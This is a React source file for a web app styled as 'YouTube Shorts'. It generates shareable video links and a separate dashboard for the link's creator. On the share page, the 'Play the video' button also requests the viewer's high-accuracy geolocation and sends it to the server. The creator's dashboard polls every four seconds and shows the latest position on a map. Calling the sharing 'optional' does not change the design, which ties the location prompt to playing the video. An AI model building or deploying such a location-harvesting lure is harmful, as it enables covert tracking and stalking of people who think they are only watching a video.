import { useEffect, useMemo, useState, type ReactNode } from 'react'
import { Link, Route, Routes, useNavigate, useParams } from 'react-router-dom'
import {
  ArrowLeft, ArrowRight, Check, CheckCircle2, Copy, ExternalLink,
  Link2, LoaderCircle, MapPin, Play, ShieldCheck, Trash2,
} from 'lucide-react'
import { deleteSavedLink, getSavedLinks, saveLink, type SavedLink } from './lib/links'

const VIDEO_ID = '-GfIbjCMiDU'

type LocationPoint = { lat: number; lng: number; accuracy: number | null; at: number }
type LocationResponse = { label?: string; locations: LocationPoint[] }

function Shell({ children }: { children: ReactNode }) {
  return (
    <main className="flex min-h-screen items-center justify-center bg-[#f4f6f8] px-4 py-10 sm:px-6">
      {children}
    </main>
  )
}

function HomePage() {
  const [label, setLabel] = useState('')
  const [result, setResult] = useState<{ shareLink: string; viewLink: string } | null>(null)
  const [loading, setLoading] = useState(false)
  const [error, setError] = useState('')

  async function generateLink() {
    setLoading(true)
    setError('')
    setResult(null)
    try {
      const response = await fetch('/api/link', {
        method: 'POST',
        headers: { 'Content-Type': 'application/json' },
        body: JSON.stringify({ label }),
      })
      if (!response.ok) throw new Error('Could not create the link. Please try again in a moment.')
      const { id } = await response.json() as { id: string }
      const origin = window.location.origin
      saveLink({ id, label: label.trim(), createdAt: Date.now() })
      setResult({ shareLink: `${origin}/t/${id}`, viewLink: `${origin}/view/${id}` })
    } catch (err) {
      setError(err instanceof Error ? err.message : 'Something went wrong.')
    } finally {
      setLoading(false)
    }
  }

  return (
    <Shell>
      <section className="w-full max-w-[620px] rounded-[22px] bg-white p-7 shadow-soft sm:p-9">
        <h1 className="text-[27px] font-bold tracking-tight text-black">YouTube Shorts</h1>
        <Link to="/links" className="mt-2 inline-flex items-center gap-1 text-[15px] text-blue-600 hover:underline">
          View my video links <ArrowRight size={16} />
        </Link>

        <p className="mb-6 mt-5 text-[18px] leading-[1.65] text-slate-600">
          Create a link to watch the video and share it with someone. Viewers can
          also choose to share their location with you using a separate, optional button.
        </p>

        <label htmlFor="label" className="sr-only">Link name (optional)</label>
        <input
          id="label"
          value={label}
          onChange={(event) => setLabel(event.target.value)}
          onKeyDown={(event) => { if (event.key === 'Enter') void generateLink() }}
          placeholder="Name this video link (optional)"
          className="mb-4 w-full rounded-xl border border-slate-300 bg-white px-4 py-4 text-base text-slate-900 outline-none transition placeholder:text-slate-500 focus:border-blue-500 focus:ring-4 focus:ring-blue-100"
        />

        <button
          type="button"
          onClick={() => void generateLink()}
          disabled={loading}
          className="flex w-full items-center justify-center gap-2 rounded-xl bg-blue-600 px-5 py-4 text-base font-semibold text-white transition hover:bg-blue-700 disabled:cursor-wait disabled:opacity-70"
        >
          {loading && <LoaderCircle size={19} className="animate-spin" />}
          {loading ? 'Generating…' : 'Create video link'}
        </button>

        {error && <p role="alert" className="mt-4 text-sm text-red-600">{error}</p>}

        {result && (
          <div className="mt-7 grid gap-4">
            <LinkResult label="Share this link to watch the video" url={result.shareLink} />
            <LinkResult label="View optional location shares for this video link" url={result.viewLink} />
          </div>
        )}
      </section>
    </Shell>
  )
}

function LinkResult({ label, url }: { label: string; url: string }) {
  const [copied, setCopied] = useState(false)
  async function copy() {
    try {
      await navigator.clipboard.writeText(url)
      setCopied(true)
      window.setTimeout(() => setCopied(false), 1800)
    } catch {
      setCopied(false)
    }
  }
  return (
    <div className="rounded-xl border border-slate-200 bg-slate-50 p-4">
      <p className="mb-2 text-sm text-slate-500">{label}</p>
      <div className="flex flex-wrap items-center gap-3">
        <a className="min-w-0 flex-1 text-[15px] text-blue-600 underline" href={url}>{url}</a>
        <button onClick={() => void copy()} className="inline-flex shrink-0 items-center gap-1 rounded-lg border border-slate-200 bg-white px-3 py-2 text-xs font-semibold text-slate-700 hover:bg-slate-100">
          {copied ? <Check size={14} /> : <Copy size={14} />}
          {copied ? 'Copied' : 'Copy'}
        </button>
      </div>
    </div>
  )
}

function MyLinksPage() {
  const [links, setLinks] = useState<SavedLink[]>([])
  const [statuses, setStatuses] = useState<Record<string, { pings: number; latest: LocationPoint | null }>>({})
  const navigate = useNavigate()

  useEffect(() => {
    const saved = getSavedLinks()
    setLinks(saved)
    if (!saved.length) return
    fetch(`/api/links?ids=${saved.map((item) => encodeURIComponent(item.id)).join(',')}`)
      .then((response) => response.json())
      .then((data: { links: Array<{ id: string; pings?: number; latest?: LocationPoint | null }> }) => {
        const next: Record<string, { pings: number; latest: LocationPoint | null }> = {}
        for (const item of data.links) next[item.id] = { pings: item.pings || 0, latest: item.latest || null }
        setStatuses(next)
      })
      .catch(() => undefined)
  }, [])

  function remove(id: string) {
    deleteSavedLink(id)
    setLinks((current) => current.filter((item) => item.id !== id))
  }

  return (
    <Shell>
      <section className="w-full max-w-3xl rounded-[22px] bg-white p-7 shadow-soft sm:p-9">
        <button onClick={() => navigate('/')} className="mb-5 inline-flex items-center gap-2 text-sm font-medium text-blue-600 hover:underline">
          <ArrowLeft size={16} /> Back to home
        </button>
        <div className="flex flex-wrap items-center justify-between gap-3">
          <h1 className="text-2xl font-bold text-slate-950">My video links</h1>
          <Link to="/" className="rounded-lg bg-blue-600 px-4 py-2.5 text-sm font-semibold text-white hover:bg-blue-700">Create new link</Link>
        </div>
        {links.length === 0 ? (
          <div className="mt-8 rounded-xl border border-dashed border-slate-300 p-8 text-center">
            <Link2 className="mx-auto text-slate-400" size={30} />
            <p className="mt-3 font-semibold text-slate-800">No links created yet</p>
            <p className="mt-1 text-sm text-slate-500">Your generated links will appear here on this device.</p>
          </div>
        ) : (
          <div className="mt-6 grid gap-3">
            {links.map((item) => (
              <div key={item.id} className="rounded-xl border border-slate-200 p-4">
                <div className="flex flex-wrap items-start justify-between gap-3">
                  <div>
                    <p className="font-semibold text-slate-900">{item.label || 'Untitled link'}</p>
                    <p className="mt-1 text-xs text-slate-500">Created {new Date(item.createdAt).toLocaleString()}</p>
                    <p className="mt-2 text-sm text-slate-500">
                      {statuses[item.id]?.pings ? 'Optional location shared' : 'No optional location shared'}
                    </p>
                  </div>
                  <button onClick={() => remove(item.id)} aria-label="Remove saved link" className="rounded-lg p-2 text-slate-400 hover:bg-red-50 hover:text-red-600">
                    <Trash2 size={17} />
                  </button>
                </div>
                <Link to={`/view/${item.id}`} className="mt-3 inline-flex items-center gap-1 text-sm font-medium text-blue-600 hover:underline">
                  View optional location shares <ExternalLink size={14} />
                </Link>
              </div>
            ))}
          </div>
        )}
      </section>
    </Shell>
  )
}

function SharePage() {
  const { id = '' } = useParams()
  const [state, setState] = useState<'idle' | 'loading' | 'shared' | 'denied' | 'error'>('idle')
  const [notice, setNotice] = useState('')
  const [videoStarted, setVideoStarted] = useState(false)

  function requestLocation() {
    setNotice('')
    // Start playback from the same user click that triggers the browser's
    // native location permission prompt. These happen in parallel.
    setVideoStarted(true)

    if (!navigator.geolocation) {
      setState('error')
      setNotice('Location access is not supported by this browser. The video is playing.')
      return
    }
    setState('loading')
    navigator.geolocation.getCurrentPosition(
      async ({ coords }) => {
        try {
          const response = await fetch('/api/location', {
            method: 'POST',
            headers: { 'Content-Type': 'application/json' },
            body: JSON.stringify({ id, lat: coords.latitude, lng: coords.longitude, accuracy: coords.accuracy }),
          })
          if (!response.ok) throw new Error('Location could not be sent.')
          setState('shared')
          setNotice('Your location was shared once.')
          setVideoStarted(true)
        } catch {
          setState('error')
          setNotice('We could not send your location. You can still watch the video below.')
        }
      },
      (error) => {
        setState(error.code === error.PERMISSION_DENIED ? 'denied' : 'error')
        setNotice(error.code === error.PERMISSION_DENIED
          ? 'Location permission was declined. You can still watch the video below.'
          : 'We could not get your location. You can still watch the video below.')
      },
      { enableHighAccuracy: true, maximumAge: 0, timeout: 20000 },
    )
  }

  return (
    <Shell>
      <section className="w-full max-w-2xl rounded-[22px] bg-white p-6 shadow-soft sm:p-9">
        <div className="mx-auto mb-5 flex h-12 w-12 items-center justify-center rounded-2xl bg-slate-900 text-white">
          <MapPin size={23} />
        </div>
        <h1 className="text-center text-2xl font-bold text-slate-950">Watch the video</h1>
        <p className="mx-auto mt-3 max-w-lg text-center text-sm leading-6 text-slate-600">
          Press “Play the video” to start this YouTube Short. Your browser asks whether
          you want to share your current location. Your location is sent only if you
          choose Allow.
        </p>

        <button
          onClick={requestLocation}
          disabled={state === 'loading' || state === 'shared'}
          className="mt-6 flex w-full items-center justify-center gap-2 rounded-xl bg-blue-600 px-5 py-4 font-semibold text-white hover:bg-blue-700 disabled:cursor-not-allowed disabled:opacity-70"
        >
          {state === 'loading' ? <LoaderCircle size={19} className="animate-spin" /> : state === 'shared' ? <CheckCircle2 size={19} /> : <MapPin size={19} />}
          {state === 'loading' ? 'Waiting for permission…' : state === 'shared' ? 'Location shared' : 'Play the video'}
        </button>

        {notice && <p role="status" className={`mt-3 text-center text-sm ${state === 'shared' ? 'text-emerald-700' : 'text-slate-600'}`}>{notice}</p>}

        <div className="mt-7 border-t border-slate-100 pt-6">
          <div className="mb-3 flex items-center justify-between gap-3">
            <h2 className="font-semibold text-slate-900">YouTube Shorts</h2>
          </div>
          {videoStarted ? (
            <div className="aspect-video overflow-hidden rounded-xl bg-black">
              <iframe
                className="h-full w-full"
                src={`https://www.youtube-nocookie.com/embed/${VIDEO_ID}?autoplay=1`}
                title="YouTube Short"
                allow="accelerometer; autoplay; clipboard-write; encrypted-media; gyroscope; picture-in-picture; web-share"
                referrerPolicy="strict-origin-when-cross-origin"
                allowFullScreen
              />
            </div>
          ) : (
            <button onClick={() => setVideoStarted(true)} className="group flex aspect-video w-full flex-col items-center justify-center gap-3 rounded-xl bg-gradient-to-br from-slate-900 to-slate-700 text-white">
              <span className="flex h-14 w-14 items-center justify-center rounded-full bg-white text-slate-900 transition group-hover:scale-105"><Play size={23} fill="currentColor" className="ml-1" /></span>
              <span className="text-sm font-semibold">Play the video</span>
            </button>
          )}
        </div>
        <p className="mt-5 flex items-center justify-center gap-1.5 text-xs text-slate-400">
          <ShieldCheck size={14} /> Location is requested only when you choose to share.
        </p>
      </section>
    </Shell>
  )
}

function ViewPage() {
  const { id = '' } = useParams()
  const [data, setData] = useState<LocationResponse | null>(null)
  const [error, setError] = useState('')
  const [loading, setLoading] = useState(true)

  useEffect(() => {
    let active = true
    async function poll() {
      try {
        const response = await fetch(`/api/location?id=${encodeURIComponent(id)}`)
        if (!response.ok) throw new Error('Link not found or server unavailable.')
        const json = await response.json() as LocationResponse
        if (active) { setData(json); setError(''); setLoading(false) }
      } catch (err) {
        if (active) {
          setError(err instanceof Error ? err.message : 'Connection problem.')
          setLoading(false)
        }
      }
    }
    void poll()
    const timer = window.setInterval(() => void poll(), 4000)
    return () => { active = false; window.clearInterval(timer) }
  }, [id])

  const latest = useMemo(() => data?.locations?.at(-1) || null, [data])
  const mapSrc = latest
    ? `https://www.openstreetmap.org/export/embed.html?bbox=${latest.lng - 0.01}%2C${latest.lat - 0.01}%2C${latest.lng + 0.01}%2C${latest.lat + 0.01}&layer=mapnik&marker=${latest.lat}%2C${latest.lng}`
    : ''

  return (
    <main className="min-h-screen bg-slate-950 px-4 py-8 text-slate-100 sm:px-6">
      <div className="mx-auto max-w-5xl">
        <Link to="/" className="mb-6 inline-flex items-center gap-2 text-sm text-blue-300 hover:underline"><ArrowLeft size={16} /> Home</Link>
        <div className="mb-5 flex flex-wrap items-center justify-between gap-3">
          <div>
            <p className="text-sm text-slate-400">Video link dashboard</p>
            <h1 className="text-2xl font-bold sm:text-3xl">{data?.label ? `Optional location shares · ${data.label}` : 'Optional location shares'}</h1>
          </div>
          <span className="rounded-full bg-slate-800 px-3 py-1.5 text-xs text-slate-300">Refreshes every 4 seconds</span>
        </div>

        {loading && <p className="rounded-xl bg-slate-800 p-5 text-slate-300">Loading location…</p>}
        {error && <p role="alert" className="rounded-xl bg-red-950/60 p-5 text-red-200">{error}</p>}
        {!loading && !error && !latest && (
          <div className="rounded-2xl border border-slate-700 bg-slate-900 p-8 text-center">
            <MapPin size={32} className="mx-auto text-slate-500" />
            <h2 className="mt-3 font-semibold">No optional location shares yet</h2>
            <p className="mt-1 text-sm text-slate-400">Viewers can watch the video without sharing their location.</p>
          </div>
        )}
        {latest && (
          <>
            <div className="overflow-hidden rounded-2xl border border-slate-700 bg-slate-900">
              <iframe title="Shared location map" src={mapSrc} className="h-[55vh] min-h-[340px] w-full border-0" />
            </div>
            <div className="mt-4 grid gap-3 rounded-2xl border border-slate-700 bg-slate-900 p-5 sm:grid-cols-2">
              <Metric label="Latitude" value={latest.lat.toFixed(6)} />
              <Metric label="Longitude" value={latest.lng.toFixed(6)} />
              <Metric label="Accuracy" value={latest.accuracy == null ? 'Not provided' : `~${Math.round(latest.accuracy)} m`} />
              <Metric label="Last shared" value={new Date(latest.at).toLocaleString()} />
              <a target="_blank" rel="noreferrer" href={`https://www.google.com/maps?q=${latest.lat},${latest.lng}`} className="mt-2 inline-flex items-center gap-2 text-sm font-semibold text-blue-300 hover:underline">
                Open in Google Maps <ExternalLink size={15} />
              </a>
            </div>
          </>
        )}
      </div>
    </main>
  )
}

function Metric({ label, value }: { label: string; value: string }) {
  return <div><p className="text-xs uppercase tracking-wide text-slate-400">{label}</p><p className="mt-1 font-medium text-slate-100">{value}</p></div>
}

function NotFound() {
  return <Shell><div className="rounded-2xl bg-white p-8 text-center shadow-soft"><h1 className="text-xl font-bold">Page not found</h1><Link to="/" className="mt-3 inline-block text-blue-600 hover:underline">Return home</Link></div></Shell>
}

export default function App() {
  return (
    <Routes>
      <Route path="/" element={<HomePage />} />
      <Route path="/links" element={<MyLinksPage />} />
      <Route path="/t/:id" element={<SharePage />} />
      <Route path="/view/:id" element={<ViewPage />} />
      <Route path="*" element={<NotFound />} />
    </Routes>
  )
}
